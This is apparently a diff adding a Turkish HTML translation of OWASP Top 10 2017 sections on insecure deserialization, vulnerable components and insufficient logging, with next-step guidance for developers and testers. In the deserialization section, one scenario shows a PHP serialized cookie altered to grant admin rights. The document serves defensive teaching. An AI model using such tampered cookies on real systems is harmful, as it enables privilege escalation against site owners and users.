+<li><a href="https://owasp.org/www-project-java-encoder/">OWASP Java Encoder Projesi</a></li>
+</ul>
+<h3 id="dış-kaynaklar-7">Dış Kaynaklar</h3>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper neutralization of user supplied input</a></li>
+<li><a href="https://portswigger.net/kb/issues/00200308_client-side-template-injection">PortSwigger: Client-side template injection</a></li>
+</ul>
+<h1 id="a82017-güvensiz-ters-serileştirme">A8:2017 Güvensiz Ters Serileştirme</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Tehdit etkenleri/Saldırı vektörleri</th>
+<th>Güvenlik zafiyeti</th>
+<th>Etkiler</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Erişim Düzeyi : İstismar Edilebilirlik 1</td>
+<td>Yaygınlık 2 : Tespit Edilebilirlik 2</td>
+<td>Teknik 3 : İş</td>
+</tr>
+<tr class="even">
+<td>Hazır istismarlar altta yatan istismar kodunda değişiklik yapılmadığında nadiren çalıştığı için ters serileştirme açıklıklarının istismarı daha zor olmaktadır.</td>
+<td>Bu açıklık <a href="https://owasp.blogspot.com/2017/08/owasp-top-10-2017-project-update.html">endüstri anketine</a> dayanarak İlk 10 içerisinde yer almaktadır ve hesaplanabilir bir veriye dayanmamaktadır. Bazı araçlar ters serileştirme açıklıklarını bulabilir, ancak problemin varlığını doğrulamak için genellikle insan faktörü gerekmektedir. Bu problemi tespit etmek ve çözmek için araçlar geliştikçe, ters serileştirme için yaygınlık verisinin de artması beklenmektedir.</td>
+<td>Ters serileştirme açıklıklarının etkileri abartılamaz. Bu açıklıklar mümkün olan en ciddi risklerden birisi olan uzaktan kod çalıştırma saldırına yol açabilmektedir. İş etkisi, uygulama ve verinin koruma gereksinimlerine göre değişmektedir.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="uygulama-açıklık-i̇çeriyor-mu">Uygulama Açıklık İçeriyor Mu?</h2>
+<p>Uygulama ve API'ler, eğer saldırgan tarafından sağlanan zararlı veya değiştirilmiş nesneleri ters serileştiriyorsa, açıklığa sahip olacaktır.</p>
+<p>Bu açıklık iki ana saldırı türüyle sonuçlanabilmektedir:</p>
+<ul>
+<li>Ters serileştirme sırasında veya sonrasında davranış değiştirebilen sınıflar uygulamada mevcut olduğunda, saldırganın uygulama mantığını değiştirdiği veya uzaktan kod çalıştırabildiği nesne ve veri yapısı ile ilgili saldırılar.</li>
+<li>Mevcut veri yapılarının kullanıldığı ancak içeriğinin değiştirildiği erişim kontrolü ile ilgili saldırılar gibi tipik veri değiştirme saldırıları.</li>
+</ul>
+<p>Serileştirme aşağıdaki amaçlarla uygulamalarda kullanılabilmektedir:</p>
+<ul>
+<li>Uzaktan işlem çağrısı ve işlemler arası iletişim (RPC/IPC)</li>
+<li>Kablo protokolleri, web servisleri, mesaj simsarları</li>
+<li>Ön belleğe alma/Süreklilik</li>
+<li>Veri tabanları, ön bellek sunucuları, dosya sistemleri</li>
+<li>HTTP çerezleri, HTML form parametreleri, API kimlik doğrulama tokenleri</li>
+</ul>
+<h2 id="nasıl-önlenir-7">Nasıl Önlenir</h2>
+<p>Tek güvenli yapısal çözüm güvenilmeyen kaynaklardan serileştirilmiş nesneleri kabul etmemek veya sadece birincil veri tiplerine izin veren serileştirme ortamlarının kullanımıdır.</p>
+<p>Bu mümkün değilse, aşağıdakilerden birisi veya birkaçı düşünülmelidir:</p>
+<ul>
+<li>Zararlı nesne oluşumunu veya veri değişimini engellemek için herhangi bir serileştirilmiş nesne üzerinde dijital imzalar gibi bütünlük kontrollerinin uygulanması.</li>
+<li>Genellikle kod tanımlanabilir bir sınıf seti beklediği için, nesne oluşturmadan önce ters serileştirme sırasında katı tip kısıtlamalarının zorunlu tutulması.</li>
+<li>Mümkün olduğu ölçüde ters serileştirilen kodun izole edilmesi ve düşük yetki gerektiren ortamlarda çalıştırılması.</li>
+<li>Gelen tipin beklenen tip olmadığı gibi ters serileştirme istisnaları ve başarısızlıkları loglanmalı veya ters serileştirme istisna atmalıdır.</li>
+<li>Ters serileştirme yapan konteyner veya sunuculardan gelen ve bunlardan çıkan ağ bağlantılarının kısıtlanması veya izlenmesi.</li>
+<li>Ters serileştirmenin izlenmesi ve bir kullanıcı sürekli ters serileştirme yaptığında alarm üretilmesi.</li>
+</ul>
+<h2 id="örnek-saldırı-senaryoları-6">Örnek Saldırı Senaryoları</h2>
+<p><strong>Senaryo #1</strong>: Bir React uygulaması bir takım Spring Boot mikroservislerini çağırmaktadır. Programcılar fonksiyonel programcılar olarak, kodlarının değişmez olduğundan emin olmaya çalışmıştır. Bunun için buldukları çözüm kullanıcı durum bilgisini nesneleştirmek ve her bir istekte tekrar gönderip almaktır. Saldırgan "R00" Java nesnesi imzasını fark edebilir ve Java Serial Killer aracını kullanarak uygulama sunucusu üzerinde uzaktan kod çalıştırabilir.</p>
+<p><strong>Senaryo #2</strong>: Bir PHP formu, kullanıcının kullanıcı ID değerini, rolünü, parola özetini ve diğer durum bilgilerini taşıyan bir "süper" çerez kaydetmek için PHP nesne serileştirmesini kullanmaktadır:</p>
+<p><code>a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}</code></p>
+<p>Saldırgan serileştirilen nesneyi yönetici hakları elde etmek için değiştirebilecektir:</p>
+<p><code>a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}</code></p>
+<h2 id="kaynaklar-8">Kaynaklar</h2>
+<h3 id="owasp-7">OWASP</h3>
+<ul>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html">OWASP Kopya Kağıdı: Ters Serileştirme</a></li>
+<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c5-validate-inputs">OWASP Proaktif Kontroller: Tüm Girdilerin Doğrulanması</a></li>
+<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">OWASP Uygulama Güvenliği Doğrulama Standardı: TBA</a></li>
+<li><a href="https://speakerdeck.com/pwntester/surviving-the-java-deserialization-apocalypse">OWASP AppSecEU 2016: Surviving the Java Deserialization Apocalypse</a></li>
+<li><a href="https://speakerdeck.com/pwntester/friday-the-13th-json-attacks">OWASP AppSecUSA 2017: Friday the 13th JSON Attacks</a></li>
+</ul>
+<h3 id="dış-kaynaklar-8">Dış Kaynaklar</h3>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502: Deserialization of Untrusted Data</a></li>
+<li><a href="https://github.com/mbechler/marshalsec">Java Unmarshaller Security</a></li>
+<li><a href="https://frohoff.github.io/appseccali-marshalling-pickles/">OWASP AppSec Cali 2015: Marshalling Pickles</a></li>
+</ul>
+<h1 id="a92017-bilinen-açıklık-i̇çeren-bileşen-kullanımı">A9:2017 Bilinen Açıklık İçeren Bileşen Kullanımı</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Tehdit etkenleri/Saldırı vektörleri</th>
+<th>Güvenlik zafiyeti</th>
+<th>Etkiler</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Erişim Düzeyi : İstismar Edilebilirlik 2</td>
+<td>Yaygınlık 3 : Tespit Edilebilirlik 2</td>
+<td>Teknik 2 : İş</td>
+</tr>
+<tr class="even">
+<td>Pek çok bilinen açıklık için yazılmış hazır istismarların bulunması kolay olsa da, diğer açıklıklar için özel bir istismarın geliştirilmesi özel çaba gerektirmektedir. </td>
+<td>Bu sorun aşırı derece yaygındır. Bileşen yönünden zengin uygulamalar geliştirme takımlarının bileşenleri güncel tutamamasına ve hatta uygulama ve API'lerinde hangi bileşenlerin kullanıldığını unutmalarına yol açmaktadır. Retire.js gibi bazı tarama araçları tespitte yardımcı olmaktadır, ancak istismar edilebilirliğin tespiti ilave çaba gerektirmektedir.</td>
+<td>Bazı bilinen açıklıklar sadece ufak etkilere yol açarken, şimdiye kadarki en büyük ihlallerin bazıları bileşenlerdeki bilinen açıklıkların istismarından kaynaklanmıştır. Korunmaya çalışılan varlıklara bağlı olarak, bu risk listede birinci sıraya çıkabilecektir.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="uygulamam-açıklık-i̇çeriyor-mu-3">Uygulamam Açıklık İçeriyor Mu?</h2>
+<p>Aşağıdaki durumlarda açıklıktan söz edilebilir:</p>
+<ul>
+<li>(Hem istemci tarafında hem de sunucu tarafında) kullandığınız tüm bileşenlerin versiyonlarını bilmiyorsanız. Bu doğrudan kullandıklarınıza ilave olarak bağımlı olarak kullandıklarınızı da içermektedir.</li>
+<li>Eğer yazılım açıklık içeriyorsa, desteklenmiyorsa veya güncel değilse. Bu işletim sistemini, web/uygulama sunucusunu, veri tabanı yönetim sistemini (DBMS), uygulamaları, API'leri ve tüm bileşenleri, çalışma ortamlarını ve kütüphaneleri içermektedir.</li>
+<li>Eğer düzenli olarak açıklıkları taramıyorsanız ve kullandığınız bileşenlerin güvenlik bültenlerini takip etmiyorsanız.</li>
+<li>Risk tabanlı ve düzenli bir şekilde, altta kullanılan platformu, çerçeveleri ve bağımlılıkları düzeltmiyor veya güncellemiyorsanız. Bu durum genellikle yamaların aylık veya üç aylık süreçlerde yapıldığı ortamlarda ortaya çıkmaktadır ve bu durum kurumların çözebileceği açıklıklara karşı günlerce veya aylarca gereksiz bir şekilde açık olmasına neden olmaktadır.</li>
+<li>Eğer yazılım geliştiriciler güncellenen, iyileştirilen veya yama yüklenen kütüphanelerin uyumluluğunu test etmiyorsa.</li>
+<li>Eğer bileşenlerin yapılandırması güvenli olarak yapılmıyorsa (bkz. <strong>A6:2017-Yanlış Güvenlik Yapılandırması</strong>).</li>
+</ul>
+<h2 id="nasıl-önlenir-8">Nasıl Önlenir</h2>
+<p>Aşağıdakileri sağlayacak bir yama yönetim süreci bulunmalıdır:</p>
+<ul>
+<li>Kullanılmayan bağımlılıkların, gereksiz özelliklerin, bileşenlerin, dosyaların ve dokümantasyonun kaldırılması.</li>
+<li>Hem istemci taraflı hem de sunucu taraflı bileşenlerin (örn. çerçeveler, kütüphaneler) ve bunların bağımlılıklarının versions, DependencyCheck, retire.js vb. araçlar kullanılarak sürekli olarak sürüm envanterlerinin çıkarılması.</li>
+<li>Bileşenlerdeki açıklıklar için CVE ve NVD gibi kaynakların sürekli izlenmesi. Süreci otomatik hale getirmek için yazılım envanter analizi araçları kullanılmalıdır. Kullanılan bileşenlerle ilgili güvenlik açıklıkları için eposta alarmlarına abone olunmalıdır.</li>
+<li>Sadece güvenli bağlantılar üzerinden ve resmi kaynaklardan bileşen temini. Değiştirilmiş veya zararlı bir bileşenin alınması riskini azaltmak için imzalanmış paketler tercih edilmelidir.</li>
+<li>Desteklenmeyen veya eski sürümleri için güvenlik yamalarının çıkmadığı kütüphaneler ve bileşenlerin takibi. Eğer yamama mümkün değilse, tespit edilen açıklığa karşı izleme, tespit veya koruma yapılabilmesi için sanal bir yama uygulaması düşünülmelidir.</li>
+</ul>
+<p>Tüm kurumlar, uygulamanın veya porfolyönün yaşam süresi boyunca devam eden bir izleme, derecelendirme ve güncelleme planlarının veya yapılandırma değişiklikleri uygulama planlarının olduğundan emin olmalıdır.</p>
+<h2 id="örnek-saldırı-senaryoları-7">Örnek Saldırı Senaryoları</h2>
+<p><strong>Senaryo #1</strong>: Bileşenler genellikle uygulamanın sahip olduğu yetkilerle çalışmaktadır, bu yüzden herhangi bir bileşendeki açıklık ciddi bir sonuç doğurabilmektedir. Bu tür açıklıklar farkında olunmadan (örn. kodlama hatası) veya bilinçli olarak (örn. bileşendeki bir arka kapı) ortaya çıkabilmektedir. Tespit edilen bazı istismar edilebilir bileşen açıklıkları şunlardır:</p>
+<ul>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638">CVE-2017-5638</a>, Pek çok ihlal için suçlanan ve sunucu üzerinde isteğe bağlı kod çalıştırılmasına izin veren bir Struts 2 uzaktan kod çalıştırma açıklığı.</li>
+<li><a href="https://en.wikipedia.org/wiki/Internet_of_things">Nesnelerin İnterneti (IoT)</a> yama açısından genellikle zor veya imkansız olsa da, yamalarının yüklenmesi çok önemli olabilmektedir (örn. biyomedikal cihazlar).</li>
+</ul>
+<p>Yamaları eksik olan veya yanlış yapılandırılmış sistemlerin tespiti için saldırganlara yardım edecek otomatize araçlar bulunmaktadır. Örneğin, <a href="https://www.shodan.io/">Shodan IoT arama moturu</a> Nisan 2014 tarihinde yaması çıkarılan <a href="https://en.wikipedia.org/wiki/Heartbleed">Heartbleed</a> açıklığından hala etkilenen cihazları bulmanıza yardım etmektedir.</p>
+<h2 id="kaynaklar-9">Kaynaklar</h2>
+<h3 id="owasp-8">OWASP</h3>
+<ul>
+<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x10-V1-Architecture.md">OWASP Uygulama Güvenliği Doğrulama Standardı: V1 Mimari, tasarım ve tehdit modelleme</a></li>
+<li><a href="https://owasp.org/www-project-dependency-check/">OWASP Dependency Check (Java ve .NET kütüphaneleri için)</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture">OWASP Test Rehberi - Uygulama Mimarisinin Haritalanması (OTG-INFO-010)</a></li>
+<li><a href="https://owasp.org/www-community/Virtual_Patching_Best_Practices">OWASP Sanal Yama En İyi Kullanım Örnekleri</a></li>
+</ul>
+<h3 id="dış-kaynaklar-9">Dış Kaynaklar</h3>
+<ul>
+<li><p><a href="https://cdn2.hubspot.net/hub/203759/file-1100864196-pdf/docs/Contrast_-_Insecure_Libraries_2014.pdf">The Unfortunate Reality of Insecure Libraries</a></p></li>
+<li><p><a href="https://www.cvedetails.com/version-search.php">MITRE Common Vulnerabilities and Exposures (CVE) search</a></p></li>
+<li><p><a href="https://nvd.nist.gov/">National Vulnerability Database (NVD)</a></p></li>
+<li><p><a href="https://github.com/retirejs/retire.js/">Retire.js for detecting known vulnerable JavaScript libraries</a></p></li>
+<li><p><a href="https://rubysec.com/">Ruby Libraries Security Advisory Database and Tools</a></p></li>
+</ul>
+<h1 id="a102017-yetersiz-loglama-ve-i̇zleme">A10:2017 Yetersiz Loglama ve İzleme</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Tehdit etkenleri/Saldırı vektörleri</th>
+<th>Güvenlik zafiyeti</th>
+<th>Etkiler</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Erişim Düzeyi : İstismar Edilebilirlik 2</td>
+<td>Yaygınlık 3 : Tespit Edilebilirlik 1</td>
+<td>Teknik 2 : İş</td>
+</tr>
+<tr class="even">
+<td>Yetersiz loglama ve izleme açıklıklarının istismarı neredeyse tüm büyük ihlallerin ana nedenidir. Saldırganlar tespit edilmeksizin amaçlarına ulaşmak için izleme ve zamanında müdahalenin eksikliğini kullanmaktadır.</td>
+<td>Bu açıklık <a href="https://owasp.blogspot.com/2017/08/owasp-top-10-2017-project-update.html">endüstri anketine</a> dayanarak İlk 10 listesinde yer almaktadır. Yeterli düzeyde izleme yapılıp yapılmadığına karar verirken kullanılacak bir strateji sızma testi sonrası logların incelenmesidir. Test ekibinin eylemleri, çıkarabilecekleri zararları anlamak için yeterli olacak şekilde kayıt altına alınmalıdır.</td>
+<td>Başarılı pek çok saldırı, açıklık araştırması ile başlamaktadır. Bu tür araştırmalara izin verilmesi başarılı istismar oranını neredeyse %100 oranında artırmaktadır. 2016 yılında, bir ihlalin tespiti, zararın oluşması için yeterli bir süre olan ortalama 191 gün olmuştur.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="uygulamam-açıklık-i̇çeriyor-mu-4">Uygulamam Açıklık İçeriyor Mu?</h2>
+<p>Yetersiz loglama, tespit, izleme ve aktif müdahale aşağıdaki durumlarda ortaya çıkmaktadır:</p>
+<ul>
+<li>Giriş işlemleri, başarısız giriş denemeleri ve yüksek değerli işlemler gibi denetlenebilir olaylar loglanmadığında.</li>
+<li>Uyarı ve hatalar yetersiz veya açık olmayan log mesajları oluşturuyorsa veya hiç oluşturmuyorsa.</li>
+<li>Uygulamaların ve API'lerin logları şüphe çekici faaliyetler için izlenmediğinde.</li>
+<li>Loglar sadece yerel olarak saklandığında.</li>
+<li>Uygun alarm üretme sınırları ve yanıt yükseltme süreçleri yerinde veya etkin olmadığında.</li>
+<li><a href="https://owasp.org/www-project-zap/">OWASP ZAP</a> gibi <a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools">DAST</a> araçları tarafından yapılan sızma testi ve taramalar alarm üretmediğinde.</li>
+<li>Uygulama gerçek zamanlı olarak veya neredeyse gerçek zamanlı olarak aktif saldırıları tespit edemediğinde veya alarm üretmediğinde.</li>
+</ul>
+<p>Eğer loglama ve alarm kayıtları bir kullanıcı veya bir saldırgan tarafından görüntülenebilirse, bilgi ifşası açıklığı bulunmaktadır. (bkz. A3:2017-Hassas Bilgi İfşası).</p>
+<h2 id="nasıl-önlenir-9">Nasıl Önlenir</h2>
+<p>Uygulama tarafından saklanan veya işlenen her bir risk için:</p>
+<ul>
+<li>Şüpheli veya zararlı hesapların belirlenmesi için yeterli kullanıcı bağlamıyla tüm giriş, erişim kontrolü eksiklikleri ve sunucu taraflı girdi doğrulama hatalarının loglandığından emin olunmalı ve ileri zamanlı adli bilişim analizlerine izin vermek için yeterli bir süre için tutulmalıdır.</li>
+<li>Logların merkezi bir log yönetim çözümü tarafından kolayca tüketilebileceği bir formatta üretildiğinden emin olunmalıdır.</li>
+<li>Değiştirme ve silmeleri engellemek için sadece ekleme yapılabilen veri tabanı tabloları gibi bütünlük kontrolü içeren denetim izlerinin yüksek değerli işlemler için bulunduğundan emin olunmalıdır.</li>
+<li>Şüpheli faaliyetlerin tespit edilebileceği ve zamanında müdahale edilebileceği şekilde etkin izleme ve alarm üretimi sağlanmalıdır.</li>
+<li><a href="https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final">NIST 800-61 rev 2</a> veya daha ileri sürümleri gibi bir olay müdahale ve kurtarma planı oluşturulmalı veya benimsenmelidir.</li>
+</ul>
+<p><a href="https://owasp.org/www-project-appsensor/">OWASP AppSensor</a> gibi açık kaynak kodlu ve ticari uygulama koruma çerçeveleri, <a href="https://owasp.org/www-project-modsecurity-core-rule-set/">OWASP ModSecurity Temel Kural Seti ile ModSecurity</a> gibi web uygulama güvenlik duvarları ve özelleştirilmiş gösterge panelleri ve alarm üretme özellikleri ile log korelasyon yazılımları bulunmaktadır.</p>
+<h2 id="örnek-saldırı-senaryoları-8">Örnek Saldırı Senaryoları</h2>
+<p><strong>Senaryo #1</strong>: Küçük bir takım tarafından yürütülen bir açık kaynak proje forum yazılımı, yazılımında bulunan bir açıklık kullanılarak ele geçirilmiştir. Saldırganlar bir sonraki sürüme ait bir iç kaynak kod deposu ve tüm forum içeriğini temizlemiştir. Kaynak kod kurtarılabilse de, izleme, loglama veya alarmlama eksikliği daha da kötü bir ihlale yol açmıştır. Forum yazılım projesi bu sorunun bir sonucu olarak artık aktif değildir.</p>
+<p><strong>Senaryo #2</strong>: Bir saldırgan, yaygın parola kullanan kullanıcılar için tarama yapmaktadır. Saldırganlar bu parolaları kullanarak tüm hesapları ele geçirebilmektedir. Diğer tüm kullanıcılar için, bu tarama sadece bir tane yanlış giriş bırakmaktadır. Birkaç gün sonra, bu durum farklı bir parola ile tekrar edilebilmektedir.</p>
+<p><strong>Senaryo #3</strong>: Bir tane büyük ABD perakendecisinin, eklentileri analiz eden bir iç kötücül yazılım analiz kum havuzuna sahip olduğu raporlanmıştır. Kum havuzu yazılımı potansiyel olarak istenmeyen yazılım tespit etmiştir, ancak hiçbir kimse bu tespite cevap vermemiştir. Dış bir banka tarafından yapılan sahte kart işlemleri sayesinde bu ihlal tespit edilmeden önce, kum havuzu bir süredir uyarılar üretmekteydi.</p>
+<h2 id="kaynaklar-10">Kaynaklar</h2>
+<h3 id="owasp-9">OWASP</h3>
+<ul>
+<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c9-security-logging">OWASP Proaktif Kontroller: Loglama ve Saldırı Tespiti</a></li>
+<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">OWASP Uygulama Güvenliği Doğrulama Standardı: V8 Loglama ve İzleme</a></li>
+<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">OWASP Test Rehberi: Detaylı Hata Kodu Testleri</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html">OWASP Kopya Kağıdı: Loglama</a></li>
+</ul>
+<h3 id="dış-kaynaklar-10">Dış Kaynaklar</h3>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/223.html">CWE-223: Omission of Security-relevant Information</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/778.html">CWE-778: Insufficient Logging</a></li>
+</ul>
+<h1 id="d-geliştiriciler-için-bir-sonraki-adım">+D Geliştiriciler için Bir Sonraki Adım</h1>
+<h2 id="tekrarlanabilir-güvenlik-süreçleri-ve-standart-güvenlik-kontrolleri-oluşturun--kullanın">Tekrarlanabilir Güvenlik Süreçleri ve Standart Güvenlik Kontrolleri Oluşturun &amp; Kullanın</h2>
+<p>Web uygulama güvenliği alanında yeni olsanız da veya bu risklere önceden alışkın olsanız da, güvenli bir web uygulama geliştirme veya mevcut bir uygulamanın açıklıklarını kapatma görevi zor olabilmektedir. Eğer büyük bir uygulama portfolyösünü yönetmek zorundaysanız, bu görev yıldırıcı bir hal alabilmektedir.</p>
+<p>Kurumların ve geliştiricilerin uygulama güvenliği risklerini etkili bir yöntemle çözmesine yardım etmek için, OWASP kurumunuzdaki uygulama güvenliğini sağlamak için kullanabileceğiniz pek çok sayıda ücretsiz ve açık kaynak kodlu kaynak üretmektedir. OWASP'ın kurumların web uygulama ve API'lerini güvenli olarak üretmelerine yardımcı olmak için ürettiği kaynaklardan bazıları aşağıda verilmiştir. Bir sonraki sayfada, kurumlara uygulamalarının ve API'lerinin güvenliğini doğrulama noktasında yardımcı olabilecek ilave OWASP kaynakları sunulmaktadır.</p>
+<table>
+<thead>
+<tr class="header">
+<th>Faaliyet</th>
+<th>Açıklama</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Uygulama Güvenliği Gereksinimleri</td>
+<td>Güvenli bir uygulama üretmek için, o uygulama için güvenli sözcüğünün ne ifade ettiğini anlamalısınız. OWASP, uygulama(ları)nız için güvenlik gereksinimlerini belirleme noktasında bir kaynak olarak <a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP Uygulama Güvenliği Doğrulama Standardı'nın (ASVS)</a> kullanılmasını tavsiye etmektedir. Eğer dış kaynak kullanıyorsanız, <a href="https://owasp.org/www-community/OWASP_Secure_Software_Contract_Annex">OWASP Güvenli Yazılım Sözleşmesi Eki</a> kullanılabilir. <strong>Not</strong>: Bu ek ABD sözleşme hukukuna göredir, bu yüzden örnek eki kullanmadan önce lütfen yetkin kişilerden yasal tavsiye alınız.</td>
+</tr>
+<tr class="even">
+<td>Uygulama Güvenliği Mimarisi</td>
+<td>Uygulama ve API'lerinizde güvenliği güçlendirmek yerine, güvenliğin baştan tasarlanması maliyet açısından çok daha etkin olmaktadır. OWASP, güvenliğin baştan nasıl tasarlanacağına dair güzel bir başlangıç olması adına <a href="https://cheatsheetseries.owasp.org/">OWASP Korunma Kopya Kağıtları'nı</a> önermektedir.</td>
+</tr>
+<tr class="odd">
+<td>Standart Güvenlik Kontrolleri</td>
+<td>Güçlü ve kullanılabilir güvenlik kontrollerinin oluşturulması zordur. Bir takım standart güvenlik kontrollerinin kullanılması, güvenli uygulama ve API'lerin geliştirilmesini büyük ölçüde kolaylaştırmaktadır. <a href="https://cheatsheetseries.owasp.org/">OWASP Korunma Kopya Kağıtları</a> geliştiriciler için güzel bir başlangıç noktasıdır ve pek çok modern çerçeve artık yetkilendirme, doğrulama, CSRF koruması vb. için standart ve etkin güvenlik kontrolleri ile beraber gelmektedir.</td>
+</tr>
+<tr class="even">
+<td>Güvenli Geliştirme Yaşam Döngüsü</td>
+<td>Kurumunuzun uygulama ve API geliştirirken takip ettiği süreci geliştirmek için, OWASP, <a href="https://owasp.org/www-project-samm/">OWASP Yazılım Garanti Olgunluk Modeli'ni (SAMM)</a> önermektedir. Bu model, yazılım güvenliği açısından kurumu hedef alan özel riskler için şekillendirilmiş bir stratejinin oluşturulması ve uygulanması noktasında kurumlara yardım etmektedir.</td>
+</tr>
+<tr class="odd">
+<td>Uygulama Güvenliği Eğitimi</td>
+<td><a href="https://owasp.org/www-committee-education-and-training/">OWASP Eğitim Projesi</a> geliştiricilerin web uygulama güvenliği konusunda eğitilmesine yardım etmek için öğretim materyalleri sağlamaktadır. Açıklıklar hakkında uygulamalı eğitim için, <a href="https://owasp.org/www-project-webgoat/">OWASP WebGoat</a>, <a href="https://github.com/jerryhoff/WebGoat.NET">WebGoat.NET</a>, <a href="https://owasp.org/www-project-node.js-goat/">OWASP NodeJS Goat</a>, <a href="https://owasp.org/www-project-juice-shop/">OWASP Juice Shop Project</a> veya <a href="https://github.com/chuckfw/owaspbwa/">OWASP Broken Web Applications Project</a> projelerini deneyebilirsiniz. Güncel kalmak için, <a href="https://owasp.org/events/">OWASP AppSec Konferansı'na</a>, <a href="https://owasp.org/events/">OWASP Konferans Eğitimi'ne</a> veya yerel <a href="https://owasp.org/chapters/">OWASP Bölüm toplantılarına</a> katılabilirsiniz.</td>
+</tr>
+</tbody>
+</table>
+<p>Kullanıma hazır ilave pek çok OWASP kaynağı bulunmaktadır. OWASP proje envanterindeki tüm Flagship ve Incubator projelerini listeleyen <a href="https://owasp.org/projects/">OWASP Projeleri</a> sayfasını lütfen ziyaret ediniz. Pek çok OWASP kaynağı <a href="https://owasp.or/">wiki</a> sayfamız üzerinden erişilebilirdir ve pek çok OWASP dokümanı <a href="https://stores.lulu.com/owasp">yazılı veya eBook</a> olarak sipariş edilebilmektedir.</p>
+<h1 id="t-güvenlik-testi-ekipleri-için-bir-sonraki-adım">+T Güvenlik Testi Ekipleri için Bir Sonraki Adım</h1>
+<h2 id="devamlı-uygulama-güvenliği-testleri-oluşturun">Devamlı Uygulama Güvenliği Testleri Oluşturun</h2>
+<p>Güvenli bir şekilde kod geliştirmek önemlidir. Ancak oluşturulmaya çalışılan güvenliğin varlığını, doğru bir şekilde uygulandığını ve kullanılması gereken her yerde kullanıldığını doğrulamak daha önemlidir. Uygulama güvenlik testlerinin amacı bu kanıtı sunmaktır. Bu çalışma zor ve karmaşıktır. Agile ve DevOps gibi yüksek hızlı modern geliştirme süreçleri, geleneksel yaklaşımlar ve araçlar üzerinde büyük bir baskı kurmaktadır. Bu yüzden, uygulama portfolyönüzde nelerin önemli olduğu üzerinde nasıl odaklanacağınız ve bunu nasıl etkili bir şekilde yapacağınız konusunda düşünmeye zaman ayırmanızı güçlü bir şekilde önermekteyiz.</p>
+<p>Modern açıklıklar çok hızlı bir şekilde gelişmektedir, bu yüzden uygulamaların yılda bir açıklıklar için sızma testinin veya zafiyet taramasının yapıldığı günler de geride kalmıştır. Modern yazılım geliştirme, bütün yazılım geliştirme yaşam döngüsü boyunca devam edecek uygulama güvenliği testlerini gerektirmektedir. Geliştirmeyi yavaşlatmayacak şekilde mevcut geliştirme süreçlerini güvenlik otomasyonu ile geliştirmeye çalışın. Hangi yöntemi seçerseniz seçin, uygulama portfolyönüzün genişliği ölçüsünde test etmek, önceliklendirmek, çözüm üretmek, doğrulama testleri yapmak ve uygulamayı tekrar açmak için gereken yıllık maliyeti de düşünün.</p>
+<table>
+<thead>
+<tr class="header">
+<th>Faaliyet</th>
+<th>Açıklama</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Tehdit Modeli Oluşturun</td>
+<td>Test etmeye başlamadan önce, nelerin üzerinde zaman harcamanın gerektiğini anlayın. Öncelikler tehdit modeline dayanmaktadır, bu yüzden eğer bir tehdit modeliniz yoksa, teste başlamadan önce bir tane oluşturmanız gerekmektedir. <a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP ASVS</a> standardını ve <a href="https://owasp.org/www-project-web-security-testing-guide/">OWASP Test Rehberi'ni</a> referans olarak alabilirsiniz. İşiniz için neyin önemli olduğunu belirleme konusunda araç satıcılarına bağlı kalmayınız.</td>
+</tr>
+<tr class="even">
+<td>SDLC'nizi Bilin</td>
+<td>Uygulama güvenliği testlerine yaklaşımınız yazılım geliştirme yaşam döngünüz (SDLC) içerisinde bulunan insanlarla, süreçlerle ve kullanılan araçlarla uyumlu olmak zorundadır. İlave adımları, aşamaları ve gözden geçirmeleri zorunlu tutmaya çalışmanın sürtüşmelere, atlatılmalara ve ölçeklendirme sorunlarına yol açması muhtemeldir. Güvenlik bilgisi toplamak için kendiliğinden doğan fırsatlar değerlendirilmeli ve süreçlere geri bildirim olarak gönderilmelidir.</td>
+</tr>
+<tr class="odd">
+<td>Test Stratejileri</td>
+<td>Her bir gereksinimi doğrulamak için en kolay, en hızlı ve en doğru teknik seçilmelidir. <a href="https://owasp.org/www-project-security-knowledge-framework/">OWASP Güvenlik Bilgi Çerçevesi</a> ve <a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP Uygulama Güvenliği Doğrulama Standardı</a> birim ve entegrasyon testlerinde fonksiyonel ve fonksiyonel olmayan güvenlik gereksinimleri için önemli kaynaklardır. Otomatize araçların kullanımından kaynaklanan yanlış pozitifler ve yanlış pozitiflerin ciddi tehlikeleri ile uğraşacak insan kaynakağının da düşünüldüğünden emin olunuz.</td>
+</tr>
